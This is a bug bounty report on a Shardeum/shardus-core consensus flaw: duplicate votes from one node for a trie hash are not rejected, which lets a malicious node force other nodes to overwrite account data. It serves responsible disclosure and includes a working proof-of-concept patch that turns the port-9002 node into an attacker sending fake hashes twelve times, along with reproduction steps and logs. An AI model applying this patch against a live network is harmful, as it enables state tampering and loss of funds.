# 33972 - \[BC - Critical] Inflating the votes of the hash for a malicious...

## Inflating the votes of the hash for a malicious trie data structure to bypass the consensus system and modify account data

Submitted on Aug 3rd 2024 at 08:42:07 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33972

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Direct loss of funds

### Description

### Brief/Intro

In Shardeum, no single node stores the entire state of the blockchain. A dynamic sharding system is used and the address space is divided into multiple shards, each managed by a different set of nodes.

The Shardeum network utilizes a consensus system where nodes vote on the hash of the trie data structure managed by their shard, once they agree on the data it becomes part of the next cycle.

In this report, we demonstrate how a single node in a shard can fool the consensus system, allowing it to create a malicious trie data structure and inflate its hash's votes by any amount until it wins the consensus.

As a result, all nodes will try to "repair" their data based on the hash that won the consensus. In other words, a single node can modify the state of the blockchain assigned to his shard.

> *Bypassing the consensus system to modify the state of the blockchain creates a loss of funds.*

### Vulnerability Details

After each tree computation, the correct radix and hashes are sent out to other nodes using the function `broadcastSyncHashes(...)`.

> Function broadcastSyncHashes(...): <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L3085>

The internal gossip handler `sync_trie_hashes` is responsible for syncing those trie hashes between nodes in the network, adding votes to the **hashTrieSyncConsensus** with every gossip received.

> Function sync\_trie\_hashes(...): <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L696-L767>

When adding a vote for a hash, the public key of the node that is voting is saved, but unfortunately, it is not used to prevent the same node from voting multiple times.

An attacker node can distribute the hash of a malicious data structure and vote an unlimited amount of times within seconds to always win the consensus.

After a few seconds, the `testAndPatchAccounts` function is called to test if the node is in sync on all accounts and to repair data if it is not. This repair process looks for a tree data structure that matches the hash that won the consensus, in this case, a hash for a malicious tree data structure.

### Impact Details

Bypassing the consensus system to modify the state of the blockchain creates a loss of funds.

### Proof of Concept

Download locally Shardus Core repo and Shardeum's repo locally.

Apply the following patch to the Shardeum repo:

```
git apply debug-10-nodes.patch
```

Now point Shardeum to use the local copy of Shardu's Core as instructed in the README.md file of Shardeum's codebase.

In your local copy of Shardeum, open the file `src/state-manager/AccountPatcher.ts` and replace the following snippet of code from L3227 to L3228:

```
        const promise = this.p2p.tell([messageEntry.node], 'sync_trie_hashes', messageEntry.message)
        promises.push(promise)
```

> Snippet of code from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L3227-L3228>

With this one:

```
        // HACK: INFOSEC
        // if we are 9002 (evil node) send a malicious hash and vote for it 12 times in a row
        // if we are not 9002 proceed as usual
        if (Self.getThisNodeInfo().externalPort == 9002) {
          console.log(`INFOSEC: Dup votes sent via internal`);
          let evilMessage = messageEntry.message;
          for (let i = 0; i < evilMessage.nodeHashes.length; i++) {
            evilMessage.nodeHashes[i].hash = `helloWorld${i}`;
          }
          for (let a = 0; a < 12; a++) {
            const promise = this.p2p.tell([messageEntry.node], 'sync_trie_hashes', evilMessage)
            promises.push(promise)
          }
        } else {
          const promise = this.p2p.tell([messageEntry.node], 'sync_trie_hashes', messageEntry.message)
          promises.push(promise)
        }
```

Then replace the following snippet of code from L3216 to L3223:

```
        const promise = this.p2p.tellBinary<SyncTrieHashesRequest>(
          [messageEntry.node],
          InternalRouteEnum.binary_sync_trie_hashes,
          syncTrieHashesRequest,
          serializeSyncTrieHashesReq,
          {}
        )
        promises.push(promise)
```

> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L3216-L3223>

With this:

```
        // HACK: INFOSEC
        // if we are 9002 (evil node) send a malicious hash and vote for it 12 times in a row
        // if we are not 9002 proceed as usual
        if (Self.getThisNodeInfo().externalPort == 9002) {
          console.log(`INFOSEC: Dup votes sent via binary`);
          for (let i = 0; i < syncTrieHashesRequest.nodeHashes.length; i++) {
            syncTrieHashesRequest.nodeHashes[i].hash = `helloWorld${i}`;
          }

          for (let a = 0; a < 12; a++) {
            const promise = this.p2p.tellBinary<SyncTrieHashesRequest>(
              [messageEntry.node],
              InternalRouteEnum.binary_sync_trie_hashes,
              syncTrieHashesRequest,
              serializeSyncTrieHashesReq,
              {}
            )
            promises.push(promise)
          }
        } else {
          const promise = this.p2p.tellBinary<SyncTrieHashesRequest>(
            [messageEntry.node],
            InternalRouteEnum.binary_sync_trie_hashes,
            syncTrieHashesRequest,
            serializeSyncTrieHashesReq,
            {}
          )
          promises.push(promise)
        }
```

With these changes, we have modified the node to do the following:

* If the current node executing the code is **NOT** running in port 9002, then is going to be a legit/good node and it will run as usual. No modifications are made to these nodes, they will gossip the correct hashes.
* If the current node executing the code **IS** running in port 9002, then is going to be a malicious node, that will gossip a malicious hash and inflate its votes in the consensus system until it wins v.s. the correct/legit hash, and forces the network to "repair" their data.

Now build both codebases, and start the network with 10 nodes using shardus's CLI (`shardus start 10`)

Wait until cycle 16 before proceeding with the next step. All nodes should be active and synced by cycle 16.

Finally, go to the log file at `./instances/shardus-instance-9004/logs/fatal.log` and it will be filled with errors abut not being in sync and having bad accounts.

```
[2024-08-02T20:24:23.050] [FATAL] fatal - isInSync = false bad accounts cycle:14 bad:0 received:0 failedH: 0 filtered:{"accepted":0,"sameTS":0,"sameTSFix":0,"tooOld":0,"tsFix2":0,"tsFix3":0} stats:{"badSyncRadix":16,"checkedLevel":2,"fixLastSeen":0,"fix_butHashMatch":0,"getAccountHashStats":{"actualRadixRequests":0,"empty":0,"exceptions":0,"matched":0,"nullResults":0,"numRequests":0,"radixToReq":0,"responses":0,"visisted":0},"leafResponses":0,"leafsChecked":0,"needsVotes":0,"ok_noTrieAcc":0,"ok_trieHashBad":0,"skippedSyncRadix":0,"subHashesTested":0,"testedSyncRadix":16,"trailColdLevel":2} getAccountStats: {"multiRequests":0,"requested":0,"skipping":0} details: []
```

> Change 9004 in the filepath with another port to check other nodes complain as well.

A huge dump asking to repair all data accounts can be found in `./instances/shardus-instance-9004/logs/main.log` - is too big to paste here.

## Conclusion

In this POC we prove how to bypass the consensus system and fool the network into believing they have the wrong data state and must repair the accounts data with "the correct" trie data structure.
